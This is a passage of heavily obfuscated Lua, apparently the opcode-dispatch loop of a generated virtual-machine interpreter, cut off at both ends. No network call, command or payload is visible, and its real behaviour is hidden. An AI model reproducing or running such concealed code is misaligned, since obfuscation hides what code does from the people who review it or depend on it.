k=k+1;c[a]=l[k];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=-c[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=-c[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=(a[3]~=0);b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];end;elseif g<=200 then if g<=198 then if not c[a[2]]then b=b+1;else b=a[3];end;elseif g>199 then local a=a[2]c[a](f(c,a+1,h))else local g;local i;local h;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];h=a[2]c[h]=c[h](f(c,h+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];g=c[i]for a=i+1,a[4]do g=g..c[a];end;c[a[2]]=g;b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;end;elseif g<=201 then c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;elseif g>202 then local d=a[2];local f=c[d+2];local e=c[d]+f;c[d]=e;if(f>0)then if(e<=c[d+1])then b=a[3];c[d+3]=e;end elseif(e>=c[d+1])then b=a[3];c[d+3]=e;end else local d=a[2]local e={c[d](f(c,d+1,a[3]))};local b=0;for a=d,a[4]do b=b+1;c[a]=e[b];end end;elseif g<=208 then if g<=205 then if g>204 then local h;local g;g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];else local j;local l,k;local m;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];m=c[a[3]];c[g+1]=m;c[g]=m[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]l,k=i(c[g](f(c,g+1,a[3])))h=k+g-1 j=0;for a=g,h do j=j+1;c[a]=l[j];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]l,k=i(c[g](f(c,g+1,a[3])))h=k+g-1 j=0;for a=g,h do j=j+1;c[a]=l[j];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];end;elseif g<=206 then local h;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];b=a[3];elseif g==207 then if c[a[2]]then b=b+1;else b=a[3];end;else local h;local g;g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=a[4];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=a[4];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=a[4];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=a[4];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=(a[3]~=0);b=b+1;a=d[b];c[a[2]]=e[a[3]];end;elseif g<=211 then if g<=209 then local j;local l,k;local g;c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]l,k=i(c[g](f(c,g+1,a[3])))h=k+g-1 j=0;for a=g,h do j=j+1;c[a]=l[j];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];elseif g>210 then local g;local f;c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=(a[3]~=0);b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];f=a[2]c[f](c[f+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];f=a[2];g=c[a[3]];c[f+1]=g;c[f]=g[a[4]];else if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;end;elseif g<=212 then local g;local i;local h;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];h=a[2]c[h]=c[h](f(c,h+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];g=c[i]for a=i+1,a[4]do g=g..c[a];end;c[a[2]]=g;b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;elseif g==213 then local h;local g;c[a[2]]();b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]]-c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]]*c[a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;else c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];end;elseif g<=235 then if g<=224 then if g<=219 then if g<=216 then if g>215 then local a=a[2]c[a]=c[a](f(c,a+1,h))else local a=a[2]c[a]=c[a]()end;elseif g<=217 then local g;c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];elseif g>218 then local g;local j;local l,m;local k;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];k=c[a[3]];c[g+1]=k;c[g]=k[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];g=a[2];k=c[a[3]];c[g+1]=k;c[g]=k[a[4]];b=b+1;a=d[b];g=a[2]l,m=i(c[g](c[g+1]))h=m+g-1 j=0;for a=g,h do j=j+1;c[a]=l[j];end;b=b+1;a=d[b];g=a[2]l={c[g](f(c,g+1,h))};j=0;for a=g,a[4]do j=j+1;c[a]=l[j];end b=b+1;a=d[b];b=a[3];else c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];end;elseif g<=221 then if g>220 then local g;c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];else local f;c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=a[4];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];f=a[2]c[f](c[f+1])end;elseif g<=222 then local g;local i;local h;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];h=a[2]c[h]=c[h](f(c,h+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];g=c[i]for a=i+1,a[4]do g=g..c[a];end;c[a[2]]=g;b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;elseif g>223 then c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=(not c[a[3]]);b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];b=a[3];else local h;local g;c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];end;elseif g<=229 then if g<=226 then if g==225 then local h;local g;c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];else c[a[2]]=c[a[3]]*c[a[4]];end;elseif g<=227 then local g;local f;c[a[2]]=a[3];b=b+1;a=d[b];f=a[2]c[f](c[f+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=(a[3]~=0);b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];f=a[2];g=c[a[3]];c[f+1]=g;c[f]=g[a[4]];elseif g==228 then c[a[2]]=c[a[3]][a[4]];else local g;local i;local h;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];h=a[2]c[h]=c[h](f(c,h+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];g=c[i]for a=i+1,a[4]do g=g..c[a];end;c[a[2]]=g;b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;end;elseif g<=232 then if g<=230 then local j;local k,l;local g;c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]k,l=i(c[g](f(c,g+1,a[3])))h=l+g-1 j=0;for a=g,h do j=j+1;c[a]=k[j];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];elseif g>231 then local h;local g;c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])else c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];end;elseif g<=233 then local g;local f;local e;c[a[2]]();b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];e=a[2];f=c[e]g=c[e+2];if(g>0)then if(f>c[e+1])then b=a[3];else c[e+3]=f;end elseif(f<c[e+1])then b=a[3];else c[e+3]=f;end elseif g==234 then local a=a[2]c[a](f(c,a+1,h))else local j;local k,l;local g;c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];g=a[2]k,l=i(c[g](c[g+1]))h=l+g-1 j=0;for a=g,h do j=j+1;c[a]=k[j];end;b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]]=e[a[3]];end;elseif g<=246 then if g<=240 then if g<=237 then if g==236 then local k;local m,l;local j;local 